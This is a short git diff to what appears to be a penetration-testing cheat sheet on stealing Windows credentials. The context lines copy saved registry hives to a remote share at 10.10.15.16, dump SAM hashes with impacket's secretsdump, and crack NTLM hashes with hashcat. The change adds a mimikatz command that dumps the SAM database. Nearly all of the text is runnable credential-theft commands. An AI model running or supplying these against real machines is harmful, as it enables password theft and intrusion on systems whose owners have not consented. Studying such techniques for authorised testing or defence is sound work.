@@ -73,7 +73,14 @@ C:\> move system.save \\10.10.15.16\CompData
 python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
 ```
 
-4) **Cracking Hashes with Hashcat**
+4) **mimikatz**
+```
+./mimikatz.exe "privilege::debug" "lsadump::sam /patch"
+
+
+```
+
+5) **Cracking Hashes with Hashcat**
 
 ```bash
 sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
